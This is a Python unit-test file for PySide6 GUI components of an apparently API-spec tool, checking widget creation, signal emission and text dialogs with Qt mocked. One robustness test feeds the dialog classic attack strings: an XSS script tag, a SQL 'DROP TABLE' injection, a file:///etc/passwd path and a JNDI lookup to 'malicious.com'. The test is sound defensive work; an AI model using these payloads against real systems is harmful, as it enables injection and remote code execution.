"""
Test suite for UI components
"""

import unittest
import unittest.mock
import sys
from unittest.mock import patch, MagicMock

# Mock PySide6 before importing any UI modules
mock_pyside6 = MagicMock()
mock_pyside6.QtCore = MagicMock()
mock_pyside6.QtGui = MagicMock()
mock_pyside6.QtWidgets = MagicMock()

sys.modules['PySide6'] = mock_pyside6
sys.modules['PySide6.QtCore'] = mock_pyside6.QtCore
sys.modules['PySide6.QtGui'] = mock_pyside6.QtGui
sys.modules['PySide6.QtWidgets'] = mock_pyside6.QtWidgets

# Add the parent directory to the path so we can import our modules
import os
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))


class TestLogoHeader(unittest.TestCase):
    """Test LogoHeader component"""
    
    def setUp(self):
        # Mock Qt widgets
        with patch('UI.components.LogoHeader.QtWidgets.QWidget'), \
             patch('UI.components.LogoHeader.QtWidgets.QHBoxLayout'), \
             patch('UI.components.LogoHeader.QtWidgets.QLabel'), \
             patch('UI.components.LogoHeader.QtWidgets.QPushButton'), \
             patch('UI.components.LogoHeader.QtCore.QObject'):
            from UI.components.LogoHeader import LogoHeader
            self.logo_header = LogoHeader()
    
    def test_logo_header_init(self):
        """Test LogoHeader initialization"""
        self.assertIsNotNone(self.logo_header)
    
    def test_logo_header_signals(self):
        """Test LogoHeader signal emissions"""
        # Test import signal
        with patch.object(self.logo_header, 'importRequested') as mock_signal:
            self.logo_header._import()
            mock_signal.emit.assert_called_once()
        
        # Test export signal
        with patch.object(self.logo_header, 'exportRequested') as mock_signal:
            self.logo_header._export()
            mock_signal.emit.assert_called_once()
        
        # Test run signal
        with patch.object(self.logo_header, 'runRequested') as mock_signal:
            self.logo_header._run()
            mock_signal.emit.assert_called_once()


class TestTabsComponent(unittest.TestCase):
    """Test TabsComponent"""
    
    def setUp(self):
        # Mock Qt widgets and SpecStore
        with patch('UI.components.TabsComponent.QtWidgets.QTabWidget'), \
             patch('UI.components.TabsComponent.HeadersSection'), \
             patch('UI.components.TabsComponent.EndpointsSection'), \
             patch('UI.components.TabsComponent.TokensSection'):
            from UI.components.TabsComponent import TabsComponent
            mock_store = MagicMock()
            self.tabs = TabsComponent(mock_store)
    
    def test_tabs_component_init(self):
        """Test TabsComponent initialization"""
        self.assertIsNotNone(self.tabs)
    
    def test_tabs_component_getters(self):
        """Test TabsComponent getter methods"""
        # Should return the mock sections
        headers = self.tabs.get_headers()
        endpoints = self.tabs.get_endpoints()  
        tokens = self.tabs.get_tokens()
        
        self.assertIsNotNone(headers)
        self.assertIsNotNone(endpoints)
        self.assertIsNotNone(tokens)


class TestDialogUtils(unittest.TestCase):
    """Test DialogUtils functions"""
    
    def setUp(self):
        # Mock Qt components
        self.qt_patches = {
            'QDialog': patch('UI.components.DialogUtils.QtWidgets.QDialog'),
            'QVBoxLayout': patch('UI.components.DialogUtils.QtWidgets.QVBoxLayout'),
            'QHBoxLayout': patch('UI.components.DialogUtils.QtWidgets.QHBoxLayout'),
            'QTextEdit': patch('UI.components.DialogUtils.QtWidgets.QTextEdit'),
            'QPushButton': patch('UI.components.DialogUtils.QtWidgets.QPushButton'),
            'QLabel': patch('UI.components.DialogUtils.QtWidgets.QLabel'),
        }
        
        for name, patcher in self.qt_patches.items():
            setattr(self, f'mock_{name.lower()}', patcher.start())
            self.addCleanup(patcher.stop)
    
    def test_multiline_input(self):
        """Test multiline_input function"""
        from UI.components.DialogUtils import multiline_input
        
        # Mock dialog execution
        mock_dialog = MagicMock()
        mock_dialog.exec.return_value = 1  # QDialog.Accepted
        self.mock_qdialog.return_value = mock_dialog
        
        # Mock text edit
        mock_text_edit = MagicMock()
        mock_text_edit.toPlainText.return_value = "test input"
        self.mock_qtextedit.return_value = mock_text_edit
        
        result_text, ok = multiline_input(None, "Title", "Prompt")
        
        self.assertTrue(ok)
        self.assertEqual(result_text, "test input")
    
    def test_multiline_input_cancelled(self):
        """Test multiline_input when user cancels"""
        from UI.components.DialogUtils import multiline_input
        
        # Mock dialog execution - cancelled
        mock_dialog = MagicMock()
        mock_dialog.exec.return_value = 0  # QDialog.Rejected
        self.mock_qdialog.return_value = mock_dialog
        
        result_text, ok = multiline_input(None, "Title", "Prompt")
        
        self.assertFalse(ok)
        self.assertEqual(result_text, "")
    
    def test_show_text(self):
        """Test show_text function"""
        from UI.components.DialogUtils import show_text
        
        # Mock dialog
        mock_dialog = MagicMock()
        self.mock_qdialog.return_value = mock_dialog
        
        # Mock text edit
        mock_text_edit = MagicMock()
        self.mock_qtextedit.return_value = mock_text_edit
        
        show_text(None, "Title", "Content")
        
        # Should set the content in text edit
        mock_text_edit.setPlainText.assert_called_once_with("Content")
        # Should show dialog
        mock_dialog.exec.assert_called_once()


class TestUIComponentsSecurityAndEdgeCases(unittest.TestCase):
    """Test UI components with security considerations and edge cases"""
    
    def setUp(self):
        # Mock Qt components
        self.qt_patches = {
            'QWidget': patch('UI.components.LogoHeader.QtWidgets.QWidget'),
            'QHBoxLayout': patch('UI.components.LogoHeader.QtWidgets.QHBoxLayout'),
            'QLabel': patch('UI.components.LogoHeader.QtWidgets.QLabel'),
            'QPushButton': patch('UI.components.LogoHeader.QtWidgets.QPushButton'),
            'QTabWidget': patch('UI.components.TabsComponent.QtWidgets.QTabWidget'),
            'QDialog': patch('UI.components.DialogUtils.QtWidgets.QDialog'),
            'QTextEdit': patch('UI.components.DialogUtils.QtWidgets.QTextEdit'),
        }
        
        for name, patcher in self.qt_patches.items():
            setattr(self, f'mock_{name.lower()}', patcher.start())
            self.addCleanup(patcher.stop)
    
    def test_dialog_utils_with_malicious_content(self):
        """Test DialogUtils with potentially malicious content"""
        from UI.components.DialogUtils import show_text
        
        # Mock dialog and text edit
        mock_dialog = MagicMock()
        self.mock_qdialog.return_value = mock_dialog
        mock_text_edit = MagicMock()
        self.mock_qtextedit.return_value = mock_text_edit
        
        # Test with various malicious inputs
        malicious_inputs = [
            "<script>alert('xss')</script>",
            "'; DROP TABLE users; --",
            "\x00\x01\x02\x03",  # Binary data
            "A" * 100000,  # Very long string
            "🔓🔒🛡️💀☠️",  # Unicode symbols
            "file:///etc/passwd",
            "${jndi:ldap://malicious.com/}"
        ]
        
        for malicious_content in malicious_inputs:
            try:
                show_text(None, "Title", malicious_content)
                # Should set content without crashing
                mock_text_edit.setPlainText.assert_called_with(malicious_content)
            except Exception as e:
                self.fail(f"show_text crashed with malicious content: {e}")
    
    def test_multiline_input_with_large_content(self):
        """Test multiline_input with very large content"""
        from UI.components.DialogUtils import multiline_input
        
        # Mock dialog and text edit
        mock_dialog = MagicMock()
        mock_dialog.exec.return_value = 1  # Accepted
        self.mock_qdialog.return_value = mock_dialog
        
        mock_text_edit = MagicMock()
        large_content = "x" * 1000000  # 1MB of text
        mock_text_edit.toPlainText.return_value = large_content
        self.mock_qtextedit.return_value = mock_text_edit
        
        result_text, ok = multiline_input(None, "Title", "Prompt")
        
        # Should handle large content
        self.assertTrue(ok)
        self.assertEqual(result_text, large_content)
    
    def test_logo_header_rapid_signal_emission(self):
        """Test LogoHeader with rapid signal emissions"""
        with patch('UI.components.LogoHeader.QtCore.QObject'):
            from UI.components.LogoHeader import LogoHeader
            logo_header = LogoHeader()
        
        # Mock signals
        logo_header.importRequested = MagicMock()
        logo_header.exportRequested = MagicMock()
        logo_header.runRequested = MagicMock()
        
        # Rapidly emit signals
        for _ in range(1000):
            logo_header._import()
            logo_header._export()
            logo_header._run()
        
        # Should handle rapid emissions without crashing
        self.assertEqual(logo_header.importRequested.emit.call_count, 1000)
        self.assertEqual(logo_header.exportRequested.emit.call_count, 1000)
        self.assertEqual(logo_header.runRequested.emit.call_count, 1000)
    
    def test_tabs_component_with_null_store(self):
        """Test TabsComponent with None store"""
        with patch('UI.components.TabsComponent.QtWidgets.QTabWidget'), \
             patch('UI.components.TabsComponent.HeadersSection'), \
             patch('UI.components.TabsComponent.EndpointsSection'), \
             patch('UI.components.TabsComponent.TokensSection'):
            from UI.components.TabsComponent import TabsComponent
            
            # Should handle None store gracefully
            try:
                tabs = TabsComponent(None)
                self.assertIsNotNone(tabs)
            except Exception as e:
                self.fail(f"TabsComponent crashed with None store: {e}")
    
    def test_dialog_utils_with_unicode_titles(self):
        """Test DialogUtils with unicode titles and prompts"""
        from UI.components.DialogUtils import multiline_input, show_text
        
        # Mock Qt components
        mock_dialog = MagicMock()
        mock_dialog.exec.return_value = 1
        self.mock_qdialog.return_value = mock_dialog
        
        mock_text_edit = MagicMock()
        mock_text_edit.toPlainText.return_value = "response"
        self.mock_qtextedit.return_value = mock_text_edit
        
        unicode_titles = [
            "测试标题",  # Chinese
            "عنوان اختبار",  # Arabic
            "тестовый заголовок",  # Russian
            "🔒 Security Test 🔒",  # Emojis
            "𝕿𝖊𝖘𝖙 𝕿𝖎𝖙𝖑𝖊"  # Mathematical symbols
        ]
        
        for title in unicode_titles:
            try:
                # Test multiline_input
                result_text, ok = multiline_input(None, title, f"Prompt for {title}")
                self.assertTrue(ok)
                
                # Test show_text
                show_text(None, title, f"Content for {title}")
                
            except Exception as e:
                self.fail(f"Dialog functions crashed with unicode title '{title}': {e}")


class TestUIComponentsIntegration(unittest.TestCase):
    """Test UI components integration scenarios"""
    
    def setUp(self):
        # Mock all Qt components
        self.qt_patches = {}
        
        qt_widgets = [
            'QWidget', 'QHBoxLayout', 'QVBoxLayout', 'QLabel', 'QPushButton',
            'QTabWidget', 'QDialog', 'QTextEdit', 'QLineEdit', 'QComboBox'
        ]
        
        for widget in qt_widgets:
            for module in ['LogoHeader', 'TabsComponent', 'DialogUtils']:
                patch_path = f'UI.components.{module}.QtWidgets.{widget}'
                patcher = patch(patch_path)
                self.qt_patches[f'{module}_{widget}'] = patcher
                setattr(self, f'mock_{module.lower()}_{widget.lower()}', patcher.start())
                self.addCleanup(patcher.stop)
        
        # Mock QtCore
        for module in ['LogoHeader', 'TabsComponent']:
            patch_path = f'UI.components.{module}.QtCore.QObject'
            patcher = patch(patch_path)
            self.qt_patches[f'{module}_QObject'] = patcher
            setattr(self, f'mock_{module.lower()}_qobject', patcher.start())
            self.addCleanup(patcher.stop)
    
    def test_components_interaction(self):
        """Test interaction between different UI components"""
        # Mock view sections
        with patch('UI.components.TabsComponent.HeadersSection'), \
             patch('UI.components.TabsComponent.EndpointsSection'), \
             patch('UI.components.TabsComponent.TokensSection'):
            
            from UI.components.LogoHeader import LogoHeader
            from UI.components.TabsComponent import TabsComponent
            from UI.components.DialogUtils import multiline_input, show_text
            
            # Create components
            logo_header = LogoHeader()
            mock_store = MagicMock()
            tabs = TabsComponent(mock_store)
            
            # Test signal connections
            logo_header.importRequested = MagicMock()
            logo_header.exportRequested = MagicMock()
            logo_header.runRequested = MagicMock()
            
            # Simulate user interactions
            logo_header._import()
            logo_header._export()
            logo_header._run()
            
            # Verify signals were emitted
            logo_header.importRequested.emit.assert_called_once()
            logo_header.exportRequested.emit.assert_called_once()
            logo_header.runRequested.emit.assert_called_once()
            
            # Test dialog functions
            mock_dialog = MagicMock()
            mock_dialog.exec.return_value = 1
            self.mock_dialogutils_qdialog.return_value = mock_dialog
            
            mock_text_edit = MagicMock()
            mock_text_edit.toPlainText.return_value = "test content"
            self.mock_dialogutils_qtextedit.return_value = mock_text_edit
            
            text, ok = multiline_input(None, "Test", "Enter text:")
            self.assertTrue(ok)
            self.assertEqual(text, "test content")
            
            show_text(None, "Output", "Result content")
            mock_text_edit.setPlainText.assert_called_with("Result content")


if __name__ == "__main__":
    unittest.main()